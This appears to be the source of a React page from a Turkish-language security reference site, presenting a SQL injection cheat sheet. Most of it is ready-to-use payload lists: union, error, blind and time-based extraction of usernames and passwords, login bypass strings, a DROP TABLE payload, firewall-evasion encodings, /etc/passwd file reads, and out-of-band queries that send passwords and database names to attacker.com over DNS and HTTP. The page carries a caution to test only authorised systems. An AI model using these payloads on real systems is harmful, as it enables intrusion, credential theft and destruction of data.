"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "giris", title: "Giriş", level: 2 },
  { id: "union-based", title: "Union-Based SQLi", level: 2 },
  { id: "error-based", title: "Error-Based SQLi", level: 2 },
  { id: "blind-sqli", title: "Blind SQLi", level: 2 },
  { id: "time-based", title: "Time-Based SQLi", level: 2 },
  { id: "auth-bypass", title: "Authentication Bypass", level: 2 },
  { id: "waf-bypass", title: "WAF Bypass", level: 2 },
  { id: "out-of-band", title: "Out-of-Band SQLi", level: 2 },
]

const fadeIn = {
  hidden: { opacity: 0, y: 20 },
  visible: { opacity: 1, y: 0 }
}

// Union-Based Payloads
const unionPayloads = [
  { code: `' UNION SELECT NULL--`, note: "Kolon sayısını tespit etmek için başlangıç noktası" },
  { code: `' UNION SELECT NULL,NULL--`, note: "2 kolonlu tablo için" },
  { code: `' UNION SELECT NULL,NULL,NULL--`, note: "3 kolonlu tablo için" },
  { code: `' UNION SELECT 1,2,3--`, note: "Hangi kolonların görüntülendiğini bulmak için" },
  { code: `' UNION SELECT username,password FROM users--`, note: "Kullanıcı bilgilerini çekmek için temel payload" },
  { code: `' UNION SELECT table_name,NULL FROM information_schema.tables--`, note: "Tüm tablo isimlerini listele" },
  { code: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`, note: "Belirli tablonun kolon isimlerini çek" },
  { code: `' UNION SELECT CONCAT(username,':',password),NULL FROM users--`, note: "Birden fazla kolonu birleştir" },
  { code: `' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables--`, note: "Tüm tabloları tek satırda göster" },
  { code: `' UNION SELECT @@version,NULL--`, note: "MySQL versiyon bilgisi" },
  { code: `' UNION SELECT version(),NULL--`, note: "PostgreSQL versiyon bilgisi" },
  { code: `' UNION SELECT banner,NULL FROM v$version--`, note: "Oracle versiyon bilgisi" },
  { code: `1' UNION SELECT NULL,NULL,NULL FROM dual--`, note: "Oracle için dual tablosu kullanımı" },
  { code: `' UNION ALL SELECT NULL,NULL,NULL--`, note: "UNION ALL ile duplicate sonuçları da göster" },
  { code: `' UNION SELECT load_file('/etc/passwd'),NULL--`, note: "MySQL dosya okuma (FILE yetkisi gerekli)" },
]

// Error-Based Payloads
const errorPayloads = [
  { code: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--`, note: "MySQL EXTRACTVALUE ile hata mesajında veri sızdır" },
  { code: `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--`, note: "MySQL UPDATEXML ile veri sızdırma" },
  { code: `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`, note: "MySQL double query injection" },
  { code: `' AND 1=CONVERT(int,(SELECT @@version))--`, note: "MSSQL CONVERT ile hata bazlı enjeksiyon" },
  { code: `' AND 1=CAST((SELECT @@version) AS int)--`, note: "PostgreSQL/MSSQL CAST ile hata" },
  { code: `'||(SELECT ''||DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE rownum=1)) FROM dual)||'`, note: "Oracle hata bazlı" },
  { code: `' AND GTID_SUBSET(CONCAT((SELECT database())),1)--`, note: "MySQL 5.6+ GTID fonksiyonu ile" },
  { code: `' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))--`, note: "MySQL JSON fonksiyonları ile" },
  { code: `' AND EXP(~(SELECT * FROM (SELECT @@version)x))--`, note: "MySQL EXP overflow hatası" },
  { code: `' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--`, note: "MSSQL tip dönüşüm hatası" },
]

// Blind SQLi Payloads
const blindPayloads = [
  { code: `' AND 1=1--`, note: "Boolean true - sayfa normal yüklenirse zafiyet var" },
  { code: `' AND 1=2--`, note: "Boolean false - sayfa farklı yüklenirse zafiyet var" },
  { code: `' AND SUBSTRING((SELECT database()),1,1)='a'--`, note: "Veritabanı adının ilk harfini tahmin et" },
  { code: `' AND (SELECT COUNT(*) FROM users)>0--`, note: "users tablosu var mı kontrol et" },
  { code: `' AND (SELECT LENGTH(database()))=5--`, note: "Veritabanı adı uzunluğunu bul" },
  { code: `' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--`, note: "Binary search ile karakter bul" },
  { code: `' AND (SELECT username FROM users WHERE username='admin' AND LENGTH(password)>10)='admin'--`, note: "Şifre uzunluğunu bul" },
  { code: `' AND ORD(MID((SELECT password FROM users LIMIT 0,1),1,1))>50--`, note: "MySQL ORD/MID ile blind" },
  { code: `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--`, note: "CASE WHEN ile conditional" },
  { code: `' AND EXISTS(SELECT * FROM users WHERE username='admin')--`, note: "EXISTS ile kayıt kontrolü" },
  { code: `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--`, note: "Tablo sayısını bul" },
  { code: `' OR (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--`, note: "OR ile blind injection" },
]

// Time-Based Payloads
const timePayloads = [
  { code: `' AND SLEEP(5)--`, note: "MySQL - 5 saniye bekle" },
  { code: `' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--`, note: "MySQL conditional sleep" },
  { code: `'; WAITFOR DELAY '0:0:5'--`, note: "MSSQL - 5 saniye bekle" },
  { code: `' AND pg_sleep(5)--`, note: "PostgreSQL - 5 saniye bekle" },
  { code: `' AND 1=(SELECT 1 FROM pg_sleep(5))--`, note: "PostgreSQL alternatif" },
  { code: `' AND DBMS_LOCK.SLEEP(5)--`, note: "Oracle - 5 saniye bekle (DBA yetkisi gerekli)" },
  { code: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--`, note: "Oracle alternatif sleep" },
  { code: `' AND IF(1=1,SLEEP(5),0)--`, note: "MySQL IF ile conditional sleep" },
  { code: `' AND (SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0))--`, note: "Karakter bazlı time-based" },
  { code: `' AND BENCHMARK(10000000,SHA1('test'))--`, note: "MySQL BENCHMARK ile gecikme" },
  { code: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`, note: "PostgreSQL CASE WHEN" },
  { code: `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`, note: "Subquery ile sleep" },
  { code: `1' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')#`, note: "Şifre karakteri time-based" },
]

// Auth Bypass Payloads
const authBypassPayloads = [
  { code: `admin'--`, note: "En temel bypass - şifre kontrolünü atla" },
  { code: `admin'#`, note: "MySQL yorum karakteri ile bypass" },
  { code: `' OR '1'='1`, note: "Klasik OR bypass" },
  { code: `' OR '1'='1'--`, note: "OR bypass + yorum" },
  { code: `' OR '1'='1'/*`, note: "OR bypass + çok satırlı yorum" },
  { code: `admin' OR 1=1--`, note: "Kullanıcı adı bilinen bypass" },
  { code: `' OR 1=1 LIMIT 1--`, note: "İlk kullanıcı olarak giriş" },
  { code: `' OR 1=1 ORDER BY 1--`, note: "Sıralama ile bypass" },
  { code: `admin'/*`, note: "Yorum ile şifre alanını geç" },
  { code: `' UNION SELECT 'admin','password'--`, note: "Union ile fake admin oluştur" },
  { code: `') OR ('1'='1`, note: "Parantez içinde bypass" },
  { code: `')) OR (('1'='1`, note: "Çift parantez bypass" },
  { code: `' OR username LIKE '%admin%'--`, note: "LIKE ile admin kullanıcısı bul" },
  { code: `' OR 1=1; DROP TABLE users;--`, note: "Tehlikeli! - Bypass + tablo silme" },
  { code: `admin' AND '1'='1`, note: "AND ile doğru sonuç zorla" },
  { code: `' OR ''='`, note: "Boş string karşılaştırma" },
  { code: `' OR 'x'='x`, note: "Alternatif OR bypass" },
  { code: `'="OR'`, note: "Kısa bypass" },
  { code: `1' OR 1=1 OR '1'='1`, note: "Çoklu OR bypass" },
  { code: `' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand(0)*2)) HAVING MIN(0) OR '1`, note: "Gelişmiş error-based auth bypass" },
]

// WAF Bypass Payloads
const wafBypassPayloads = [
  { code: `/*!50000UNION*/+/*!50000SELECT*/+1,2,3--`, note: "MySQL versiyon bazlı yorum bypass" },
  { code: `%55nion%20%53elect`, note: "URL encoding ile bypass" },
  { code: `UNION%0ASELECT`, note: "Newline ile bypass" },
  { code: `UNION%09SELECT`, note: "Tab karakteri ile bypass" },
  { code: `UNION%0DSELECT`, note: "Carriage return ile bypass" },
  { code: `UNION%0BSELECT`, note: "Vertical tab ile bypass" },
  { code: `UNION%0CSELECT`, note: "Form feed ile bypass" },
  { code: `UNION%A0SELECT`, note: "Non-breaking space ile bypass" },
  { code: `uNiOn SeLeCt`, note: "Karışık büyük/küçük harf" },
  { code: `UNION/**/SELECT`, note: "Inline yorum ile bypass" },
  { code: `UNION/*/**/*/SELECT`, note: "İç içe yorum bypass" },
  { code: `UN/**/ION+SE/**/LECT`, note: "Parçalı keyword bypass" },
  { code: `' /*!UNION*/ /*!SELECT*/ 1,2,3--`, note: "MySQL özel yorum bypass" },
  { code: `+union+distinct+select+`, note: "DISTINCT ile bypass" },
  { code: `+union+distinctROW+select+`, note: "DISTINCTROW ile bypass" },
  { code: `' UNION [ODBC] SELECT 1,2,3--`, note: "ODBC syntax bypass" },
  { code: `' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--`, note: "Tam hex encoding" },
  { code: `' UNION%23%0ASELECT 1,2,3--`, note: "Newline + yorum bypass" },
  { code: `' /*!12345UNION SELECT*/ 1,2,3--`, note: "MySQL arbitrary version comment" },
  { code: `' UNION(SELECT(1),(2),(3))--`, note: "Parantez ile keyword gizleme" },
  { code: `0x27 UNION SELECT`, note: "Hex encoded quote" },
  { code: `' AND 1=0 UNION SELECT 1,2,3--`, note: "AND ile false + union" },
  { code: `' UNION ALL SELECT 1,2,3--`, note: "UNION ALL bypass" },
  { code: `%2527 UNION SELECT`, note: "Double encoding" },
  { code: `' UNION SE%4cECT 1,2,3--`, note: "Partial hex encoding" },
  { code: `'; EXECUTE('SEL'+'ECT 1')--`, note: "MSSQL string concatenation" },
]

// Out-of-Band Payloads
const oobPayloads = [
  { code: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))--`, note: "MySQL DNS exfiltration (Windows)" },
  { code: `'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--`, note: "MSSQL DNS exfiltration" },
  { code: `'; EXEC master..xp_fileexist '\\\\attacker.com\\share'--`, note: "MSSQL alternatif OOB" },
  { code: `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users--`, note: "Oracle HTTP request" },
  { code: `' UNION SELECT HTTPURITYPE('http://attacker.com/'||password).GETCLOB() FROM users--`, note: "Oracle HTTPURITYPE" },
  { code: `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.com') FROM dual--`, note: "Oracle DNS lookup" },
  { code: `' UNION SELECT DBMS_LDAP.INIT((SELECT password FROM users)||'.attacker.com',80) FROM dual--`, note: "Oracle LDAP exfiltration" },
  { code: `'; DECLARE @q varchar(1024); SET @q='\\\\'+db_name()+'.attacker.com\\a'; EXEC master..xp_dirtree @q--`, note: "MSSQL dinamik DNS" },
  { code: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--`, note: "Error-based ile veri sızdır, OOB olmasa da alternatif" },
  { code: `' UNION SELECT pg_read_file('/etc/passwd')--`, note: "PostgreSQL dosya okuma (superuser gerekli)" },
]

export default function SQLInjectionPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      
      <motion.article 
        className="prose prose-invert max-w-none"
        initial="hidden"
        animate="visible"
        variants={{
          visible: { transition: { staggerChildren: 0.1 } }
        }}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
            <Database className="w-4 h-4" />
            <span>Web Zafiyetleri</span>
          </div>
          
          <h1 className="text-4xl font-bold text-foreground mb-4">
            SQL Injection (SQLi)
          </h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            SQL Injection, kullanıcı girdilerinin doğrudan SQL sorgularına eklenmesiyle ortaya çıkan kritik bir güvenlik açığıdır. 
            Veritabanı manipülasyonu, veri sızdırma ve hatta sunucu ele geçirme gibi sonuçlara yol açabilir.
          </p>
        </motion.div>

        <motion.section variants={fadeIn} id="giris" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Giriş</h2>
          <p className="text-muted-foreground mb-4">
            SQLi, OWASP Top 10 listesinde sürekli yer alan en tehlikeli web zafiyetlerinden biridir. 
            Başarılı bir saldırı ile tüm veritabanı içeriğine erişilebilir, veriler değiştirilebilir veya silinebilir.
          </p>
          
          <Callout type="danger" title="Kritik Uyarı">
            SQL Injection payloadlarını yalnızca izinli sistemlerde test edin. Yetkisiz veritabanı erişimi ciddi yasal sonuçlar doğurur.
          </Callout>
        </motion.section>

        <motion.section variants={fadeIn} id="union-based" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Union-Based SQLi</h2>
          <p className="text-muted-foreground mb-4">
            UNION operatörü kullanılarak birden fazla SELECT sorgusu birleştirilir ve sonuçlar tek bir response&apos;ta döndürülür.
          </p>
          
          <Callout type="tip" title="İpucu">
            UNION saldırısı için önce kolon sayısını tespit etmelisin. ORDER BY veya NULL ekleme yöntemiyle kolon sayısını bulabilirsin.
          </Callout>
          
          <PayloadList 
            title="Union-Based Payloadlar" 
            payloads={unionPayloads}
            initialShow={5}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="error-based" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Error-Based SQLi</h2>
          <p className="text-muted-foreground mb-4">
            Veritabanı hata mesajları içinde veri sızdırılır. Uygulama hata mesajlarını gösteriyorsa bu teknik çok etkilidir.
          </p>
          
          <Callout type="info" title="Bilgi">
            Error-based SQLi genellikle verbose hata mesajları açık olan development ortamlarında işe yarar. Production ortamlarında hatalar genellikle gizlenir.
          </Callout>
          
          <PayloadList 
            title="Error-Based Payloadlar" 
            payloads={errorPayloads}
            initialShow={5}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="blind-sqli" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Blind SQLi</h2>
          <p className="text-muted-foreground mb-4">
            Uygulama hata mesajı veya sorgu sonucu göstermediğinde kullanılır. Sayfa davranışındaki farklılıklara göre veri çıkarılır.
          </p>
          
          <Callout type="tip" title="İpucu">
            Blind SQLi yavaş bir tekniktir. Otomatize etmek için SQLMap veya custom script kullan. Binary search algoritması ile karakter başına sorgu sayısını azaltabilirsin.
          </Callout>
          
          <PayloadList 
            title="Blind SQLi Payloadlar" 
            payloads={blindPayloads}
            initialShow={5}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="time-based" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Time-Based SQLi</h2>
          <p className="text-muted-foreground mb-4">
            Boolean-based blind çalışmadığında response süresi farkına bakılarak veri çıkarılır. SLEEP() veya BENCHMARK() fonksiyonları kullanılır.
          </p>
          
          <Callout type="warning" title="Dikkat">
            Time-based SQLi çok yavaştır ve ağ gecikmelerinden etkilenebilir. Güvenilir sonuçlar için her karakteri birkaç kez doğrula.
          </Callout>
          
          <PayloadList 
            title="Time-Based Payloadlar" 
            payloads={timePayloads}
            initialShow={5}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="auth-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Authentication Bypass</h2>
          <p className="text-muted-foreground mb-4">
            Login formlarında kullanılan SQLi teknikleri. Şifre kontrolünü atlayarak sisteme giriş yapmayı sağlar.
          </p>
          
          <Callout type="danger" title="Uyarı">
            DROP TABLE içeren payloadlar veritabanını kalıcı olarak bozabilir. Test ortamında bile dikkatli kullan!
          </Callout>
          
          <PayloadList 
            title="Auth Bypass Payloadlar" 
            payloads={authBypassPayloads}
            initialShow={8}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="waf-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">WAF Bypass</h2>
          <p className="text-muted-foreground mb-4">
            Web Application Firewall&apos;ları atlatmak için kullanılan encoding ve obfuscation teknikleri.
          </p>
          
          <Callout type="tip" title="İpucu">
            WAF bypass için birden fazla tekniği birleştirmek gerekebilir. Önce WAF&apos;ın hangi keywordleri engellediğini tespit et, sonra o keywordlere özel bypass dene.
          </Callout>
          
          <PayloadList 
            title="WAF Bypass Payloadlar" 
            payloads={wafBypassPayloads}
            initialShow={8}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="out-of-band" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4">Out-of-Band SQLi</h2>
          <p className="text-muted-foreground mb-4">
            Verilerin DNS veya HTTP istekleri aracılığıyla dışarıya sızdırıldığı teknik. Blind SQLi&apos;nin hızlı alternatifi.
          </p>
          
          <Callout type="info" title="Bilgi">
            OOB SQLi için Burp Collaborator veya kendi DNS sunucunu kullanabilirsin. Oracle ve MSSQL bu tekniğe en uygun veritabanlarıdır.
          </Callout>
          
          <PayloadList 
            title="Out-of-Band Payloadlar" 
            payloads={oobPayloads}
            initialShow={5}
          />
        </motion.section>

        {/* Navigation */}
        <motion.div variants={fadeIn} className="flex items-center justify-between mt-16 pt-8 border-t border-border/50">
          <Link 
            href="/docs/web/xss" 
            className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>XSS</span>
          </Link>
          <Link 
            href="/docs/web/csrf" 
            className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
          >
            <span>CSRF</span>
            <ArrowRight className="w-4 h-4" />
          </Link>
        </motion.div>
      </motion.article>
    </div>
  )
}
